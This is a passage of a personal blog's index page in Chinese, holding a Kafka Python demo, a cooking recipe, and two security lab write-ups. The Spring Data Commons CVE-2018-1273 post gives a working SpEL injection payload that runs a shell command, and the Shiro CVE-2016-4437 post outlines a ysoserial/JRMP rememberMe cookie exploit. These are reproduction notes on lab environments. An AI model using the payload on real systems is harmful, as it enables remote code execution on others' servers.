class="keyword">import</span> KafkaProducer</span><br><span class="line"><span class="keyword">from</span> kafka.errors <span class="keyword">import</span> kafka_errors</span><br><span class="line"></span><br><span class="line">producer = KafkaProducer(</span><br><span class="line">    bootstrap_servers=[<span class="string">&#x27;zookeeper_server:port&#x27;</span>],</span><br><span class="line">    key_serializer=<span class="keyword">lambda</span> k: json.dumps(k).encode(),</span><br><span class="line">    value_serializer=<span class="keyword">lambda</span> v: json.dumps(v).encode())</span><br><span class="line"><span class="built_in">print</span> (producer.config)</span><br><span class="line">msg_dict = &#123;</span><br><span class="line">    <span class="string">&quot;sleep_time&quot;</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="string">&quot;db_config&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;database&quot;</span>: <span class="string">&quot;test_1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;host&quot;</span>: <span class="string">&quot;xxxx&quot;</span>,</span><br><span class="line">        <span class="string">&quot;user&quot;</span>: <span class="string">&quot;root&quot;</span>,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: <span class="string">&quot;root&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;table&quot;</span>: <span class="string">&quot;msg&quot;</span>,</span><br><span class="line">    <span class="string">&quot;msg&quot;</span>: <span class="string">&quot;Hello World&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">msg2_dict = <span class="string">&quot;hahahahhahaha&quot;</span></span><br><span class="line"></span><br><span class="line">msg = json.dumps(msg_dict)</span><br><span class="line">futruer = producer.send(<span class="string">&quot;kafka_demo&quot;</span>, key=<span class="string">&#x27;count_num&#x27;</span>, value=msg_dict, partition=<span class="literal">None</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">   futruer.get(timeout=<span class="number">20</span>)</span><br><span class="line"><span class="keyword">except</span> kafka_errors: <span class="comment"># 发送失败抛出kafka_errors</span></span><br><span class="line">    traceback.format_exc()</span><br></pre></td></tr></table></figure>


<p>Consumer.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> kafka <span class="keyword">import</span> KafkaConsumer</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">consumer_demo</span>():</span></span><br><span class="line">    consumer = KafkaConsumer(</span><br><span class="line">        <span class="string">&#x27;kafka_demo&#x27;</span>,</span><br><span class="line">        bootstrap_servers=<span class="string">&#x27;zookeeper_server:port&#x27;</span>,</span><br><span class="line">        group_id=<span class="string">&#x27;hahaha&#x27;</span></span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">for</span> message <span class="keyword">in</span> consumer:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;receive, key: &#123;&#125;, value: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">            json.loads(message.key.decode()),</span><br><span class="line">            json.loads(message.value.decode())</span><br><span class="line">            )</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">consumer_demo()</span><br></pre></td></tr></table></figure>





      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://hkirito.github.io/2021/07/05/Spring-Data-Commons%E8%BF%9C%E7%A8%8BRCE-CVE-2018-1273/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Sanwu">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Sanwu">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/07/05/Spring-Data-Commons%E8%BF%9C%E7%A8%8BRCE-CVE-2018-1273/" class="post-title-link" itemprop="url">Spring Data Commons远程RCE(CVE-2018-1273)</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-07-05 15:11:29" itemprop="dateCreated datePublished" datetime="2021-07-05T15:11:29+08:00">2021-07-05</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">Edited on</span>
        <time title="Modified: 2022-10-18 16:25:04" itemprop="dateModified" datetime="2022-10-18T16:25:04+08:00">2022-10-18</time>
      </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Network-Safety/" itemprop="url" rel="index"><span itemprop="name">Network-Safety</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h4 id="Spring-Data-Command"><a href="#Spring-Data-Command" class="headerlink" title="Spring Data Command"></a>Spring Data Command</h4><p>利用Java的反射机制对username这个类进行获取，然后利用这个类进行命令执行，主要的点在于</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username[<span class="comment">#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;touch /tmp/success&quot;)]=&amp;password=&amp;repeatedPassword=</span></span><br></pre></td></tr></table></figure>
<p><img src="/2021/07/05/Spring-Data-Commons%E8%BF%9C%E7%A8%8BRCE-CVE-2018-1273/cuts1.png" alt="界面"></p>
<p><img src="/2021/07/05/Spring-Data-Commons%E8%BF%9C%E7%A8%8BRCE-CVE-2018-1273/cuts.png" alt="抓包"></p>
<p><img src="/2021/07/05/Spring-Data-Commons%E8%BF%9C%E7%A8%8BRCE-CVE-2018-1273/cuts4.png" alt="结果"></p>
<p>尝试过命令输出重定向，但是失败了。原因是因为java的getruntime().exec()执行命令时并不会将命令输出及相关内容重定向，只有一个单纯的执行一条命令的功能。命令执行权限为运行服务器的用户权限执行。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://hkirito.github.io/2021/07/04/%E8%83%A1%E8%BE%A3%E6%B1%A4/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Sanwu">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Sanwu">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/07/04/%E8%83%A1%E8%BE%A3%E6%B1%A4/" class="post-title-link" itemprop="url">胡辣汤</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2021-07-04 20:24:07 / Modified: 20:42:05" itemprop="dateCreated datePublished" datetime="2021-07-04T20:24:07+08:00">2021-07-04</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Cooking/" itemprop="url" rel="index"><span itemprop="name">Cooking</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="胡辣汤做法"><a href="#胡辣汤做法" class="headerlink" title="胡辣汤做法"></a>胡辣汤做法</h1><h4 id="原材料：面粉，黄花菜，海带，木耳，豆皮，牛肉粒，"><a href="#原材料：面粉，黄花菜，海带，木耳，豆皮，牛肉粒，" class="headerlink" title="原材料：面粉，黄花菜，海带，木耳，豆皮，牛肉粒，"></a>原材料：面粉，黄花菜，海带，木耳，豆皮，牛肉粒，</h4><h4 id="配料：葱姜蒜少许，八角香叶桂皮等。"><a href="#配料：葱姜蒜少许，八角香叶桂皮等。" class="headerlink" title="配料：葱姜蒜少许，八角香叶桂皮等。"></a>配料：葱姜蒜少许，八角香叶桂皮等。</h4><h4 id="前期准备："><a href="#前期准备：" class="headerlink" title="前期准备："></a>前期准备：</h4><p>1.先和面，面与水的比例为2:1</p>
<p>待到三光（手光，盆光，面光）即可将面放置醒面（20分钟左右）</p>
<p>2.将泡好的黄花菜，海带木耳和豆皮等清洗干净，均切成5-8cm的小段即可。</p>
<p>3.将醒好的面再次揉至结实且均匀，即可开始加入凉水“洗面”（加水揉面至水浑白，将水倒至容器内放置备用，反复多次后至清洗的水不发白，面紧实为止）</p>
<h4 id="开始制作："><a href="#开始制作：" class="headerlink" title="开始制作："></a>开始制作：</h4><p>4.将切好的黄花菜，海带木耳下水焯水约一分钟左右捞出。</p>
<p>5.重新下油，将八角香叶桂皮等下锅炒出香味后捞出，加水和白葱碎煮至水烧开</p>
<p>6.将揉好的面团揪下一小段（大约一个大拇指左右）下入水中，依次下入。然后倒入煮过的黄花菜，海带，木耳。煮至水开</p>
<p>7.下入切好的牛肉粒及豆皮，然后煮开，将静置好的洗面水倒出上面的部分清水，然后搅拌均匀，缓慢倒入锅中同时朝一个方向搅拌（倒入的洗面水的量根据锅中水的量为准，此步是为了做出糊糊的感觉，所以可以根据喜好进行添加）</p>
<p>8.最后加入胡椒粉，生抽，蚝油及鸡精等调味料（个人风味添加）即可出锅。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://hkirito.github.io/2021/06/20/shiro%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%A4%8D%E7%8E%B0RCE%E5%88%A9%E7%94%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Sanwu">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Sanwu">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/06/20/shiro%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%A4%8D%E7%8E%B0RCE%E5%88%A9%E7%94%A8/" class="post-title-link" itemprop="url">shiro漏洞及复现RCE利用</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-06-20 19:18:13" itemprop="dateCreated datePublished" datetime="2021-06-20T19:18:13+08:00">2021-06-20</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">Edited on</span>
        <time title="Modified: 2022-10-18 16:25:07" itemprop="dateModified" datetime="2022-10-18T16:25:07+08:00">2022-10-18</time>
      </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Network-Safety/" itemprop="url" rel="index"><span itemprop="name">Network-Safety</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="shiro及漏洞复现"><a href="#shiro及漏洞复现" class="headerlink" title="shiro及漏洞复现"></a>shiro及漏洞复现</h1><p>首先了解漏洞原理及利用方式，漏洞CVE为</p>
<h1 id="CVE-2016-4437"><a href="#CVE-2016-4437" class="headerlink" title="CVE-2016-4437"></a>CVE-2016-4437</h1><p>其次，在shiro内的序列化处理中，将rememberMe字段的数据未做处理校验，开始直接存储和反序列化操作。导致RCE及任意代码执行。</p>
<p>准备：使用vulhub_app的shiro的docker环境，如下：</p>
<p><img src="/2021/06/20/shiro%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%A4%8D%E7%8E%B0RCE%E5%88%A9%E7%94%A8/image.png" alt="环境"></p>
<p>登录时的数据包及逻辑如下</p>
<p><img src="/2021/06/20/shiro%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%A4%8D%E7%8E%B0RCE%E5%88%A9%E7%94%A8/image_1.png" alt="登录数据包"></p>
<p>对于此字段rememberMe的反序列化利用链路如下：</p>
<p>ysoserial将命令进行序列化，然后将此命令所在的机器使用JRMP来搭建远程加载使用类。将远程利用类执行命令进行AES及Base64加密的方式将命令加载生成Cookie，替换原有的rememberMe的cookie进行RCE。</p>
<p>复现过程：</p>
<p><img src="/2021/06/20/shiro%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%A4%8D%E7%8E%B0RCE%E5%88%A9%E7%94%A8/image_2.png" alt="复现"></p>
<p><img src="/2021/06/20/shiro%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%A4%8D%E7%8E%B0RCE%E5%88%A9%E7%94%A8/image_3.png" alt="复现2"></p>
<p><img src="/2021/06/20/shiro%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%A4%8D%E7%8E%B0RCE%E5%88%A9%E7%94%A8/image_4.png" alt="复现3"></p>
<p>Tips：from Crypto.Cipher import AES导入报错时：pip install  crypto pycrypto pycryptodome</p>
<p>仍报错时可进入到pip的site-package内将crypto重命名为Crypto即可。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>

</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Sanwu</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

    </div>
  </footer>

  
  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>

  




  





</body>
</html>
